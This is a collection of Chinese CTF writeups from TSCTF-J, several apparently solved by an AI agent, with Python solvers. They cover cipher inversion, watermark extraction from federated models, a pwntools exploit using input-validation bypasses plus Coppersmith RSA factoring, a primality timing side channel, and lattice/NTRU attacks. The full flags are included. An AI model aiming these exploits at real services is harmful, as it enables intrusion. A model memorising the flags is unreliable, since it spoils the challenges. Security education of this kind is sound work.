6. **结论三：`T^{-1}` 不必逐门抄电路**——它是仿射映射，用已知明文头 `TSCTF-J{` 提供的 15 组约束在 GF(2) 上逐输出位解线性方程组即可（15 组零冲突 → 解唯一）：`T^{-1}(x3,x2,x1,x0) = (x1, x0, x2, ~x3)`，即高 2 位与低 2 位交换、最高位反相。写成查表是 `0->1 1->5 2->9 3->D 4->3 5->7 6->B 7->F 8->0 9->4 A->8 B->C C->2 D->6 E->A F->E`。
7. 由第 5 步得逐组递推公式 `b_k = a_{k-1} ^ T^{-1}(a_k)`，对 `k = 2 … 29` 逐个还原明文 nibble。第一轮还缺一个初始锁存器。
8. **结论四：初始锁存器 `c_0 = A`**，由“明文以 `T`（ASCII 0x54）开头、即首 nibble 为 `5`”定出：`c_0 = 5 ^ T^{-1}(a_0)`，再用它得到 `b_1 = c_0 ^ T^{-1}(a_1)`。
9. 按递推还原出完整明文 nibble 流 `54534354462D4A7B213F5245643574306E452D726556657253653F217D`，两两拼字节即为 29 字节的 flag。

## EXP

```python
# -*- coding: utf-8 -*-
"""MisC 定稿还原。

结论（由数据反推，不依赖抄的电路）：
  * 密文寄存器要**整体倒序**读；
  * 校验是 e == a（密文），所以 c_k = a_k；
  * T^{-1}(a_k) = a_{k-1} ^ b_k。
用已知 flag 头 "TSCTF-J{" 解出 T^{-1}（仿射，15 组约束零冲突 -> 唯一），
再解整条密文。第一轮需要初始锁存器 c_0，用 "flag 以 T 开头" 定出来。
"""
HEX = "A50032AD02C06EC46EC066911BA83938392C691ABD4875303B84684047"
A = [int(c, 16) for c in HEX][::-1]          # 倒序
EXP = [5, 4, 5, 3, 4, 3, 5, 4, 4, 6, 2, 0xD, 4, 0xA, 7, 0xB]   # TSCTF-J{

def bits(n):
    return [(n >> (3 - i)) & 1 for i in range(4)]

def solve_gf2(rows, targets):
    m = [r[:] + [t] for r, t in zip(rows, targets)]
    ncol, piv, where = len(rows[0]), 0, []
    for col in range(ncol):
        sel = next((i for i in range(piv, len(m)) if m[i][col]), None)
        if sel is None:
            continue
        m[piv], m[sel] = m[sel], m[piv]
        for i in range(len(m)):
            if i != piv and m[i][col]:
                m[i] = [a ^ b for a, b in zip(m[i], m[piv])]
        where.append(col)
        piv += 1
    for i in range(piv, len(m)):
        if all(v == 0 for v in m[i][:ncol]) and m[i][ncol]:
            return None
    w = [0] * ncol
    for i, col in enumerate(where):
        w[col] = m[i][ncol]
    return w

# --- 1. 解 T^{-1} -----------------------------------------------------------
pairs = [(A[k - 1], A[k - 2] ^ EXP[k - 1]) for k in range(2, 17)]
rows = [bits(x) + [1] for x, _ in pairs]
ws = [solve_gf2(rows, [(y >> (3 - j)) & 1 for _, y in pairs]) for j in range(4)]
assert all(w is not None for w in ws)
def Tinv(x):
    r = bits(x) + [1]
    return sum((sum(a * b for a, b in zip(w, r)) % 2) << (3 - j) for j, w in enumerate(ws))

assert all(Tinv(x) == y for x, y in pairs)          # 15 组约束全部满足
assert len({Tinv(x) for x in range(16)}) == 16      # 16/16 双射，解唯一

# --- 2. 解整条明文 ----------------------------------------------------------
b = [None] * len(A)
for k in range(2, len(A) + 1):
    b[k - 1] = A[k - 2] ^ Tinv(A[k - 1])
c0 = EXP[0] ^ Tinv(A[0])       # 初始锁存器 c_0：令第一轮明文 nibble = 5（'T' 的高位）
b[0] = c0 ^ Tinv(A[0])

nib = "".join("%X" % v for v in b)          # nibble 流: 54534354462D4A7B...217D
flag = bytes((b[i] << 4) | b[i + 1] for i in range(0, len(b), 2))
print(flag.decode())
# TSCTF-J{!?REd5t0nE-reVerSe?!}
```

<div class="pagebreak"></div>

# Secret of Script Writeup

- 分类：misc
- flag：`（未解出）`

## 思路

1. `1.txt` / `2.txt` 是谜面清单，末尾各给了一条提示：`HINT: LAST LINE OF THE THREE PICTURES ARE TIPS.` 和 `HINT: EVERY ANSWER IS IN ENGLISH LOWERCASE`。
2. 按谜面解出的词分别是 `pencil` / `window` / `chair` / `umbrella` / `thread` 与 `zipper` / `whistle` / `eraser` / `letter` / `clock`；把它们按图里的顺序拼起来能得到一串大写字母（例如 `CHAIRWIRETHREADSTRINGUMBRELLAWINDOW`），看起来离 flag 只差一层编码。
3. 前两张图这条链是**英文**推理，一路很顺；`3.png` 之后整体换成中文，工具链没用了，推理直接断掉。
4. `hint1.zip` / `hint2.zip` / `hint3.zip` 始终没打开：包里应该就是后续提示，但既没有口令来源，也没有能和谜面对上的候选词。
5. agent写的字形切分 / 词匹配脚本对 `1.png` / `2.png` 有效，到 `3.png` 就完全没用了,因为是中文.

## EXP

（已尝试的路线，均未打通）

- 手工按图解出的候选拼接：

  ```
  whistle_eraser_clock_letter_zipper
  CHAIRWIRETHREADSTRINGUMBRELLAWINDOW
  CHAIR-UMBRELLA-WIRE-GLASSES-PENCIL
  ```

- `hint*.zip`：先转成 hash，再丢字典与纯数字 / 纯小写掩码两条路，均无命中。
- 图片处理：按固定网格切格 → 字形归一化 → 与英文词表做匹配；只对前两张图有效，`3.png`（中文）没有对应的字符集，脚本失效。

<div class="pagebreak"></div>

# AI-Federate Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：AI
- flag：`TSCTF{robust_federation_ae9e5bdd33b7dc041fde50da44471db3}`

## 思路

1. 归档为 17 个检查点（第 0 轮无注入 + 16 个训练轮），每轮保存 `fc1.weight`，其形状恰为 `64×1568 = 100352`，即水印配置中的 `width`。
2. 水印配置：`carrier_size = 8192`、`symbols = 768`、`strength = 0.001`，水印种子 `3713421915`；由种子生成的 `indices`、`signs`、`order` 完全可复现。
3. 记录格式（协议）：六家机构固定为编号 0–5 的六条 256 字节记录 = 主体 252 字节 + 大端 CRC32 4 字节；主体前 32 字节为密钥贡献，编号不存于记录内，只由聚合列顺序标识。
4. 符号/字节映射：768 个符号中，符号 `s` 承载记录位置 `order[s] // 3` 的字节，故 256 个字节位各有 3 个相同符号槽（可用 `ptp == 0` 校验）。
5. FedAvg 与投影：每个客户端上传 `upload(delta, record)`，服务端每轮取 3 个客户端、样本量均为 2000，故聚合更新的载波分量 `project(carrier)` 正比于 `128/255 * (mean(record)/127.5 - 1)`，配合 +1 偏移得 `byte_sum = (mixture + 1) * 382.5`（`382.5 = 3 × 127.5`），逐轮累加得 `cumulative`。
6. 归档注入：`carrier[indices] += strength * lift(cumulative/382.5 - (t+1))`。`upload` 先减去任务增量在水印子空间的分量，故 `project(state[carrier])` 跨轮不变，只有注入项可累积：`d_R = d_0 + strength * (cumulative_R/382.5 - R)`。
7. 反解：`cumulative_R = ((d_R - d_0)/strength + R) * 382.5`，逐轮差分即得每轮字节和；归档量化容差为 0.01（校验 `max|c - rint(c)| < 0.01`）。
8. 线性系统：每轮 256 维字节和满足 `byte_sum_R[k] = Σ_{c∈P_R} b_c[k] + offset_R[k]`，即关于六个客户端字节的 16×6 整数线性系统（16 轮 × 6 客户端）。
9. 故障枚举：工单只声明 `max_abnormal_rounds = 2`、`max_abs_byte_sum_offset = 24`，不给轮次与偏移值。故枚举"排除哪些轮"的子集，用剩余轮中贪心选出 6 行满秩方程求解，再要求解为 0–255 整数、能精确复现所有干净轮、偏差轮 ≤ 2 且 `|offset| ≤ 24`；所有可行子集收敛到同一组客户端字节，本实例的偏差轮为第 4、15 轮。
10. 记录与密钥：用 `zlib.crc32` 校验每条记录末 4 字节（主体前 32 字节为 share），按 0→5 拼接六份 32 字节贡献，以 `AAD = ASCII("TSCTF-03/federated-ownership/v4")` 计算 `K = SHA256(AAD || share_0..5)`。
11. 解密：取 12 字节 `nonce` 与 `ciphertext`（末 16 字节为 GCM 认证标签），以 AES-256-GCM 解密得到 flag。

## EXP

```python
"""AI-Federate: recover the six 256-byte ownership records and decrypt the credential.

Archive model
-------------
Each archived checkpoint stores fc1.weight with, on the public carrier indices,

    carrier_R = state_R[carrier] + strength * lift(cumulative_R / (3*127.5) - R)

Every round subtracts exactly the watermark-subspace component of the aggregated
task delta, so project(state_R[carrier]) is invariant across rounds.  With
d_R = project(carrier_R) and d_0 from round_00 (no watermark):

    d_R - d_0 = strength * (cumulative_R / 382.5 - R)
    cumulative_R = ((d_R - d_0)/strength + R) * 382.5        (integers)

Per-round archive byte sums are byte_sum_R = cumulative_R - cumulative_{R-1}.
In the symbol domain, symbol s carries the byte at record position order[s]//3,
so each of the 256 byte positions has three identical symbol slots.  For round R
with participant set P_R:

    byte_sum_R[k] = sum_{c in P_R} b_c[k] + offset_R[k]

where offset is nonzero only in the (<=2) faulty rounds, |offset| <= 24.
That is a 16x6 integer system per byte position.  We identify the fault set by
exact subset solving, then verify every recovered record against its CRC32.
"""
import hashlib
import itertools
import json
import zlib

import numpy as np
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from safetensors.torch import load_file

from watermark import Watermark

AAD = b"TSCTF-03/federated-ownership/v4"

cfg = json.loads(open("config.json", encoding="utf-8").read())
rounds = json.loads(open("rounds.json", encoding="utf-8").read())
own = json.loads(open("ownership.json", encoding="utf-8").read())
wm = Watermark(**cfg["watermark"])
MAX_OFF = cfg["archive_fault"]["max_abs_byte_sum_offset"]
MAX_BAD = cfg["archive_fault"]["max_abnormal_rounds"]

# ------------------------------------------------------- step 1: per-round byte sums
def projected_carrier(r):
    w = load_file(f"models/round_{r:02d}.safetensors")["fc1.weight"]
    w = w.numpy().ravel().astype(np.float64)
    assert w.size == wm.width
    return wm.project(w[wm.indices])

d0 = projected_carrier(0)
cum = np.zeros((17, wm.symbols), dtype=np.int64)
frac = []
for r in range(1, 17):
    u = (projected_carrier(r) - d0) / wm.strength + r          # cumulative_R / 382.5
    c = u * (3 * 127.5)
    frac.append(float(np.max(np.abs(c - np.rint(c)))))
    cum[r] = np.rint(c).astype(np.int64)
assert max(frac) < 0.01                                         # archive quantization tolerance

byte_sum = np.diff(cum, axis=0)                                 # 16 x 768, symbol space
Y = np.zeros((16, 256), dtype=np.int64)                         # 16 x 256, byte position
for k in range(256):
    grp = np.flatnonzero(wm.order // 3 == k)
    assert grp.size == 3 and np.ptp(byte_sum[:, grp], axis=1).max() == 0
    Y[:, k] = byte_sum[:, grp[0]]
assert Y.min() >= 0 and Y.max() <= 3 * 255

# ------------------------------------------------------- step 2: linear system / faults
A = np.zeros((16, 6), dtype=np.int64)
for i, ev in enumerate(rounds):
    assert ev["round"] == i + 1 and len(ev["participants"]) == 3
    for p in ev["participants"]:
        A[i, p["client"]] = 1

def exact_basis(rows):
    """Pick 6 rows of A with full rank, greedily."""
    S = []
    for r in rows:
        if np.linalg.matrix_rank(A[S + [r]].astype(float)) > len(S):
            S.append(r)
        if len(S) == 6:
            return S
    return None

solutions = []
for nbad in range(MAX_BAD + 1):
    for F in itertools.combinations(range(16), nbad):
        clean = [i for i in range(16) if i not in F]
        S = exact_basis(clean)
        if S is None:
            continue
        x = np.linalg.solve(A[S].astype(float), Y[S, :].astype(float))
        xi = np.rint(x)
        if np.abs(x - xi).max() > 1e-6:
            continue
        xi = xi.astype(np.int64)
        if xi.min() < 0 or xi.max() > 255:
            continue
        resid = np.abs(A.astype(np.int64) @ xi - Y)
        bad = [i for i in range(16) if resid[i].max() > 0]
        if len(bad) > MAX_BAD or (bad and resid[bad, :].max() > MAX_OFF):
            continue
        solutions.append((F, bad, xi, resid))

assert solutions, "no fault pattern reproduces the archive"
F, bad, X, resid = solutions[0]
distinct = {s[2].tobytes() for s in solutions}
assert len(distinct) == 1, "ambiguous client bytes across fault patterns"
assert all(s[1] == bad for s in solutions), "ambiguous deviating rounds"

# ------------------------------------------------------- step 3: records + CRC32
records = [bytes(X[c].astype(np.uint8)) for c in range(6)]
for c, rec in enumerate(records):
    stored = int.from_bytes(rec[252:], "big")
    calc = zlib.crc32(rec[:252]) & 0xFFFFFFFF
    assert stored == calc, "client %d CRC mismatch" % c

# ------------------------------------------------------- step 4: decrypt
K = hashlib.sha256(AAD + b"".join(r[:32] for r in records)).digest()
flag = AESGCM(K).decrypt(bytes.fromhex(own["nonce"]),
                         bytes.fromhex(own["ciphertext"]), AAD).decode("utf-8")
print("FLAG =", flag)
```

<div class="pagebreak"></div>

# 江湖天机 Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：crypto
- flag：`TSCTF-J{e977a5a5-ebe3-c644-a757-d3bc2e764651}`

## 思路

目标是终局时 `money >= 80000000`。五幕中前四幕都能把扣款压到 0 或接近 0，第五幕才是密码学考点。

1. 第一幕 `money = lcg_100(seed)`，取第 100 次迭代的低 26 位。低 26 位只依赖 `seed mod 2^26`，且 `a = 1664525` 为奇数使映射 `x ↦ a·x+c (mod 2^26)` 成为双射——26 位状态 100 轮后仍遍历 `[0, 2^26)` 全部取值，故最大值 `0x3FFFFFF` 必可达。
2. 在模 `2^26` 下用 `a^{-1}` 从 `0x3FFFFFF` 反推 100 步，直接得到 `seed = 13804091`（无需暴力）。
3. 第二幕扣款是 `md5(s)` 末 8 字节 mod 3e7，无法构造性控制，但预算有数千万两余量，搜一个扣款极小的暗语即可：`tsctf165686` 扣 10。
4. 第三幕扣款 `pow(m, e, N) & 0x1FFFFFF`，只拦了 `m == '1'` 且用 `isdigit()` 校验；送 `m = 0` 得 `c = 0`，扣 0。
5. 第四幕 `is_unique_letters` 只收集 `isalpha()` 字符，长度门槛只看 `len`；送 `"0000"` / `"0000"` 时字母集合为空、长度 4 > 2，异或 `x ^ x = 0`。
6. 至此 `67,108,863 - 10 + 20,000,000 = 87,108,853 >= 8e7`，全场只需拿下第五幕的 RSA。
7. 第五幕 RSA-2048：`leak = p >> 462` 泄露 p 的高 562 位（`p`、`q` 各 1024 位）。记 `A = leak << 462`，则 `p = A + x` 且 `0 <= x < X = 2^462`。
8. 未知根上界 `X = 2^462` 小于已知因子高位攻击的门限 `N^(beta^2/d) = N^(1/4) = 2^512`（`beta = 1/2`，`d = 1`），留出 50 bit 余量，属标准可解区间。
9. 对 `f(x) = A + x (mod N)` 跑 Howgrave-Graham 单变量小根：移位多项式取 `g_{i,j} = x^j·N^(m-i)·f(x)^i`（`i ∈ [0,m)`，`j ∈ [0,d)`）与 `h_i = x^i·f(x)^m`（`i ∈ [0,t)`），共 `d·m + t` 条、次数 ≤ `n-1`，构成方阵后 `Matrix.lll(delta=0.99)` 约化，格维度 `dim = m + t`（本题 `d = 1`）。
10. 取根不走因式分解：两条独立短向量共享根 `x0`，对约化后前 `extra_rows = 6` 条短向量两两求多项式 `gcd`，当 `deg == 1` 时取候选根并硬校验 `N % (A + cand) == 0`。
11. `(m, t)` 由 `(2,2)` 逐级升到 `(20,20)`，本题在 `dim 12`（`m = t = 6`）命中，单次分解约 0.16 s（LLL 走 python-flint 后端）。
12. 取回 `x0` 后 `p = A + x0`、`q = N // p`（断言 `p·q == N`），再用 `d = e^{-1} mod (p-1)(q-1)` 做常规 RSA 解密，把明文 `sec` 发回服务端即可。

## EXP

```python
#!/usr/bin/env python3
"""TSCTF-J crypto-江湖天机 (jianghu tianji) exploit.

Economy analysis (money must reach 80,000,000):

  act 1  money = lcg_100(seed)   with lcg_100(seed) = (LCG^100(seed)) & 0x3FFFFFF
         Because a=1664525 is odd the LCG is a bijection mod 2^26, so the
         low 26 bits of the 100th iterate realise *every* value in [0, 2^26)
         exactly once.  Inverting the LCG mod 2^26 from 0x3FFFFFF yields
         SEED = 13804091, i.e. the maximum possible starting capital
         67,108,863.

  act 2  option 2: deduct = md5(s)[-8:] as int  mod 30,000,000.  Brute force a
         string whose deduction is negligible -> 'tsctf165686' costs 10.

  act 3  option 2: deduct = pow(m, e, N) & 0x1FFFFFF.  Send m = 0 -> c = 0 -> 0.
         (The only guard is `m_str == '1'` and `m_str.isdigit()`.)

  act 4  option 2: deduct = int(s1) ^ int(s2).  `is_unique_letters` only looks
         at alphabetic characters, so '0000' / '0000' has zero letters, passes
         the uniqueness check, and XORs to 0.

  act 5  RSA-2048 with leak = p >> 462 (562 known MSBs of p).  The unknown part
         x < 2^462 is below N^(1/4) = 2^512, so Coppersmith's univariate
         Howgrave-Graham lattice with beta = 1/2 recovers p.

  money = 67,108,863 - 10 + 20,000,000 = 87,108,853 >= 80,000,000  ->  flag.
"""
from __future__ import annotations

import argparse
import re
import sys

from Crypto.Util.number import inverse, long_to_bytes
from pwn import context, remote
from sympy import Matrix, Poly, Symbol, gcd as poly_gcd

# 题目下发的目标地址与端口（此处用占位符）
HOST = "<TARGET>"
PORT = <PORT>

x = Symbol('x')


# ===================== Coppersmith 单变量小根 =====================
# 构造（May 的综述）：
#     f(x) 首一、次数 d、模 N；存在 x0 使 |x0| <= X 且 f(x0) == 0 mod b，其中 b | N 且 b >= N^beta
#     g_{i,j}(x) = x^j * N^(m-i) * f(x)^i     i in [0,m), j in [0,d)
#     h_i(x)     = x^i * f(x)^m               i in [0,t)
#     共 n = d*m + t 条、次数 <= n-1 的多项式 -> 方阵
#     LLL -> 短向量 -> 以 x0 为整数根的多项式
def _rows(N, A, d, m, t, X, extra=4):
    """Coefficient rows (integers) of the shifted polynomials, as lists."""
    f = x + A if d == 1 else None
    if f is None:
        raise NotImplementedError('only linear f supported here')
    polys = []
    for i in range(m):
        polys.append(N ** (m - i) * (x * X + A) ** i)
    for i in range(t):
        polys.append((x * X) ** i * (x * X + A) ** m)
    n = d * m + t
    rows = []
    for p in polys:
        p = Poly(p, x)
        rows.append([int(p.coeff_monomial(x ** l)) for l in range(n)])
    return rows, n


def coppersmith_linear(N, A, X, beta, m, t, extra_rows=6, verbose=False):
    """Find x0 with |x0| < X and (A + x0) | N  (A + x0 >= N^beta).

    Returns x0 or None.
    """
    rows, n = _rows(N, A, 1, m, t, X)
    B = Matrix(rows)
    R = B.lll(delta=0.99)
    Xp = [X ** l for l in range(n)]
    polys = []
    for k in range(min(extra_rows, n)):
        row = [int(R[k, l]) // Xp[l] for l in range(n)]
        polys.append(Poly(list(reversed(row)), x))
    for i in range(len(polys)):
        for j in range(i + 1, len(polys)):
            g = poly_gcd(polys[i], polys[j])
            if g.degree() == 1:
                c1, c0 = g.all_coeffs()
                if c1 != 0 and (-c0) % c1 == 0:
                    cand = int(-c0 // c1)
                    if cand != 0 and (A + cand) > 1 and N % (A + cand) == 0:
                        return cand
    return None


def known_msb_factor(N, leak, shift, verbose=False):
    """Recover the factor p of N = p*q when leak = p >> shift is known.

    p = (leak << shift) + x  with 0 <= x < 2^shift, so A = leak << shift.
    """
    A = leak << shift
    X = 1 << shift
    beta = 0.5
    for m, t in ((2, 2), (3, 3), (4, 4), (5, 5), (6, 6), (8, 8), (10, 10),
                 (12, 12), (14, 14), (16, 16), (20, 20)):
        r = coppersmith_linear(N, A, X, beta, m, t, verbose=verbose)
        if r is not None:
            return A + r
    return None


# ===================== 交互解题流程 =====================
# ---- act 1 .. act 4 payloads ------------------------------------------------
SEED = 13804091                 # lcg_100(SEED) == 0x3FFFFFF (maximum)
ACT2_WORD = 'tsctf165686'       # md5 deduction == 10
ACT3_M = '0'                    # pow(0, e, N) == 0 -> deduction 0
ACT4_S1 = '0000'                # no alphabetic chars -> uniqueness check vacuous
ACT4_S2 = '0000'                # identical -> XOR == 0

P_SEED = '请输入你的初始种子'.encode()
P_CHOICE = '请选择 (1/2)：'.encode()
P_WORD = '请输入你的暗语：'.encode()
P_BIGINT = '请输入你要加密的大整数 m：'.encode()
P_S1 = '请输入暗语1：'.encode()
P_S2 = '请输入暗语2：'.encode()
P_ANS = '请输入你破译出的明文'.encode()


def solve(io, verbose=True):
    io.recvuntil(P_SEED)
    io.sendline(str(SEED).encode())

    io.recvuntil(P_CHOICE)          # act 2
    io.sendline(b'2')
    io.recvuntil(P_WORD)
    io.sendline(ACT2_WORD.encode())

    io.recvuntil(P_CHOICE)          # act 3
    io.sendline(b'2')
    io.recvuntil(P_BIGINT)
    io.sendline(ACT3_M.encode())

    io.recvuntil(P_CHOICE)          # act 4
    io.sendline(b'2')
    io.recvuntil(P_S1)
    io.sendline(ACT4_S1.encode())
    io.recvuntil(P_S2)
    io.sendline(ACT4_S2.encode())

    blob = io.recvuntil(P_ANS, timeout=180)
    text = blob.decode(errors='replace')

    def last(pat):
        # act 3 also prints an (uppercase) "N = ..." / "e = ..." pair, so the
        # *last* occurrence is the act 5 one in every case.
        hits = re.findall(pat, text)
        if not hits:
            raise RuntimeError(f'failed to parse {pat!r} from:\n{text}')
        return int(hits[-1])

    n = last(r'n = (\d+)')
    e = last(r'e = (\d+)')
    c = last(r'c = (\d+)')
    leak = last(r'leak = (\d+)')

    p = known_msb_factor(n, leak, 462, verbose=verbose)
    if p is None:
        raise RuntimeError('Coppersmith failed to recover p')
    q = n // p
    assert p * q == n

    d = inverse(e, (p - 1) * (q - 1))
    sec = long_to_bytes(pow(c, d, n))
    io.sendline(sec)
    return io.recvrepeat(15)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', default=HOST)
    ap.add_argument('--port', type=int, default=PORT)
    ap.add_argument('--no-tls', action='store_true')
    ap.add_argument('--timeout', type=float, default=180.0)
    args = ap.parse_args()

    context.log_level = 'info'
    kw = dict(timeout=args.timeout)
    if not args.no_tls:
        kw.update(ssl=True, sni=args.host)
    io = remote(args.host, args.port, **kw)
    try:
        out = solve(io)
        if out:
            print(out.decode(errors='replace'))
    finally:
        io.close()


if __name__ == '__main__':
    sys.exit(main())
```

<div class="pagebreak"></div>

# isitprime Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：crypto
- flag：`TSCTF-J{f0r_y0u}`

## 思路

1. **oracle**：服务每轮读整数 `inp`，令 `n = mpz(flag_int ^ inp)`（`flag_int = int(flag.hex(), 16)`），再把 `is_prime(n)` 跑 `REPEAT = 30000` 遍——耗时放大 30000 倍，单比特信息从抖动里浮出。
2. **泄漏 1 bit**：`gmpy2.is_prime` 先试除小素因子，命中即返回，否则才进 Miller-Rabin。故"`n` 有无小素因子"是可测 yes/no：快样本 657600~21156200 ns（中位 1335100 ns ≈231 ns/次），慢样本 104130100~3005726000 ns，差 2~3 个数量级，阈值 `time_ns > 1e8` 切开。
3. **探针结构**：采集数据共 69541 行（含表头，列 `p,k,round,inp,time_ns`，4.7 MB），全部满足 `v2(inp) ≥ 128`（实测 128~143）且 `inp % p == k`，即 `inp = R << 128`，生成者针对候选 `p, k` 解 `R·2^128 ≡ k (mod p)`（`R = R0 + t·p`）；`p` 取遍 3..101 的 **25 个素数**，每 `k = 0..p-1`，每组 **60 轮**（`Σ p·60 = 69540`）。
4. **同余**：flag 仅 16 字节（< 2^128），与 `R << 128` 的置位区间不重叠，XOR 退化为加法 `n = flag_int ^ (R << 128) = flag_int + (R << 128) ≡ flag_int + k (mod p)`；故 `p | n`（快路径）⟺ `k ≡ -flag_int (mod p)`。对每个素数，唯一"60 轮 0 慢样本"的 `k` 即 `(-flag_int) mod p`（实测亚军组至少 4 个慢样本）。
5. **CRT 与消歧**：对 `-k` 做 25 素数 CRT 得 `flag_int ≡ 112087477883519123958020164271150757245 (mod 116431182179248680450031658440253681535)`，模数 `M = 3·5·7·…·101` 为 127 bit；`2^128` 以下只有 `t = 0, 1` 两个候选 `y + t·M`，唯一全可打印且形如 `TSCTF-J{...}` 的即 16 字节 `b'TSCTF-J{f0r_y0u}'`。
6. **方向不对称**：`p | n` 蕴含快模式，但快模式也可能来自**其它**小素因子，两个方向并不等价；因此模型要看的是"`p | n` 的行无一落在慢模式"与"每个素数恰好一组 `(p,k)` 为 60/60 整除且 0 慢样本"。
7. **全局回代**：用解出的 `flag` 复算全部 69540 行——`flag_int & inp == 0`（XOR=ADD 前提）、`p | flag^inp` 的行数恰 **1500 = 25 素数 × 60 轮**、其中慢模式 **0 行**、60/60 被 `p` 整除的 `(p,k)` 组恰 **25 组**。

## EXP

```python
#!/usr/bin/env python3
"""Is it prime?  --  timing side channel on gmpy2.is_prime  (TSCTF-J / Crypto)

Server
------
    n = flag_int ^ inp
    for _ in range(30000): is_prime(n)

`is_prime` bails out of trial division immediately when n has a small prime
factor and only then runs Miller-Rabin.  The two modes are ~3 orders of
magnitude apart (1.3e6 ns vs 1e8..2.6e9 ns for the 30000 rounds), so a single
measurement is a clean yes/no answer to "does n have a small factor".

What the CSV actually is
------------------------
  * v2(inp) >= 128 for all 69540 rows  ->  inp is always a multiple of 2^128,
    i.e. inp = R << 128 with a random 20..40 bit R.
  * inp % p == k for all rows         ->  the harness picks the candidate
    residue k and solves  R * 2^128 == k (mod p),  R = R0 + t*p.

Why that is a probe
-------------------
flag_int fits in 16 bytes (< 2^128, see below), so the probe never overlaps the
flag and XOR degenerates to plain addition:

    n = flag_int ^ (R << 128) = flag_int + (R << 128) == flag_int + k (mod p)

Hence n is divisible by p -- the fast mode -- exactly when

    k == -flag_int (mod p)

so for every prime p the group of 60 rounds *without a single slow sample* is
k = (-flag_int) mod p.  CRT over the 25 primes gives

    flag_int == y (mod M),   M = 3*5*7*...*101 = 116431182179248680450031658440253681535

M is 127 bits, so only t = 0, 1 of  y + t*M  stay below 2^128; exactly one of
those two candidates is printable ASCII:  b'TSCTF-J{f0r_y0u}'.
"""
import csv
from collections import defaultdict

PATH = 'timings.csv'
SLOW_NS = 1e8          # anything above this is a Miller-Rabin sample
FLAG_BITS = 128        # the harness shifts its probe by exactly 128 bits


def load(path=PATH):
    out = []
    with open(path, newline='') as f:
        for r in csv.DictReader(f):
            out.append((int(r['p']), int(r['k']), int(r['round']),
                        int(r['inp']), int(r['time_ns'])))
    return out


def main():
    rows = load()

    # ---------- 1. structural facts that pin down the probe ----------
    assert all((inp & -inp).bit_length() - 1 >= FLAG_BITS
               for _, _, _, inp, _ in rows), 'inp not always a multiple of 2^128'
    assert all(inp % p == k for p, k, _, inp, _ in rows), 'inp % p != k'

    # ---------- 2. one clean bit per prime: the k with zero slow rounds ----
    slow = defaultdict(int)
    for p, k, _, _, t in rows:
        if t > SLOW_NS:
            slow[(p, k)] += 1
    ps = sorted({r[0] for r in rows})
    residues = {}
    for p in ps:
        ranked = sorted({r[1] for r in rows if r[0] == p},
                        key=lambda k: slow[(p, k)])
        k, k2 = ranked[0], ranked[1]
        assert slow[(p, k)] == 0, f'no clean group for p={p}'
        residues[p] = k

    # ---------- 3. CRT on -k  (fast <=> p | flag + inp) ----------
    from sympy.ntheory.modular import crt
    y, M = crt(ps, [(-residues[p]) % p for p in ps])

    # ---------- 4. lift the 127-bit CRT result to 2^128 and pick ASCII ----
    cands = [v for t in range(2 ** FLAG_BITS // M + 1)
             if (v := y + t * M) < 2 ** FLAG_BITS]
    flag = None
    for v in cands:
        b = v.to_bytes(FLAG_BITS // 8, 'big')
        ok = all(32 <= c < 127 for c in b)
        if ok and b.startswith(b'TSCTF-J{') and b.endswith(b'}'):
            flag = b
    assert flag, 'no ASCII candidate'

    # ---------- 5. full re-verification of the model on every row --------
    # NOTE: the two directions are NOT symmetric.  "p | n" implies the fast
    # mode, but the fast mode can equally come from any *other* small factor,
    # so the interesting checks are (a) zero exceptions on p | n and
    # (b) exactly one (p, k) group per prime is 60/60 divisible with no slow
    # sample.
    f = int.from_bytes(flag, 'big')
    assert f < 2 ** FLAG_BITS
    assert all(inp & f == 0 for _, _, _, inp, _ in rows), 'probe overlaps flag'
    div = 0
    viol = 0
    groups = defaultdict(lambda: [0, 0])
    for p, k, _, inp, t in rows:
        n = f ^ inp                       # == f + inp, verified disjoint
        d = (n % p == 0)
        groups[(p, k)][0] += d
        groups[(p, k)][1] += 1
        if d:
            div += 1
            viol += (t > SLOW_NS)
    clean = [pk for pk, v in groups.items() if v[0] == v[1] == 60]
    clean_slow = sum(1 for pp, k, _, inp, t in rows
                     if (pp, k) in clean and t > SLOW_NS)
    assert div == 25 * 60 and viol == 0 and len(clean) == 25 and clean_slow == 0
    return flag.decode()


if __name__ == '__main__':
    print('RESULT:', main())
```

<div class="pagebreak"></div>

# lattice Writeup

纯agent一把梭的,看看agent的思路吧.

- 分类：crypto
- flag：`TSCTF-J{The_start_of_lattice}`

## 思路

1. 题目是三只独立上锁的匣子 P1/P2/P3，分别对应子集和、格上 CVP、NTRU 环三种结构。三问的明文片段依次为 `TSCTF-J{Th`、`e_start_of_`、`lattice}`，顺序拼接即为完整 flag，因此三问必须全部解开。
2. **P1 子集和**：已知 40 个 96 bit 权重 `a` 与目标和 `target`，求 0/1 向量 `b` 使 `sum(a_i*b_i) == target`。
3. 40 bit 正是 5 字节 `sec` 的逐位展开，`key = sha256(sec)`，AES-CBC 加密 flag。
4. `2^40` 全枚举不可行，改用 MITM：把 `a` 从中间对半（各 20 项），分别枚举 `2^20` 个子集和，前半存表、后半查 `target - s`；命中即还原 40 bit，每 8 bit 拼 1 字节得 `sec`，解密得明文。
5. **P2 格上 CVP**：`G` 是 24 维下三角格基，对角元 ∈ [2^17, 2^18)（`D=18`），上三角元 ∈ [-64, 64]（`OF=64`）；明文系数 `z` 各分量 ∈ [-20, 20]（`CD=20`），误差 `e` 各分量 ∈ [-16, 16] 且非零（`ER=16`），公开 `target = z*G + e`。
6. 发布的 `B` 是 `G` 经 180 次随机行变换（交换、取负、把另一行的 ±1/±2 倍加到某行）后的同格基，`L(B) = L(G)`；故 `v = z*B` 是格中离 `target` 极近的点（`max|target - v| <= 16`），属 CVP。
7. 对 `B` 做 LLL(δ=0.99)，再用 Babai 最近平面取最近格点 `v = z*G`；密钥为 `key = sha256(",".join(str(x) for x in v))`（逗号分隔的十进制串），AES-CBC 解密。
8. **P3 NTRU 环**：`N=24`、`q=40961`，环 `F_q[X]/(X^24-1)`；三元多项式 `f` 权重（正 6、负 5），`g` 权重（正 5、负 5）；公钥 `h = g * f^{-1} mod (X^N-1)`，满足自检 `(f*h - g) % (X^N-1) == 0`。
9. 构造 48 维格基 `[[I, H], [0, q*I]]`（`H` 为 `h` 的循环矩阵，`H[i][j] = h[(j-i) mod N]`），则 `(f, g)` 是其上超短向量，即标准 NTRU 格。
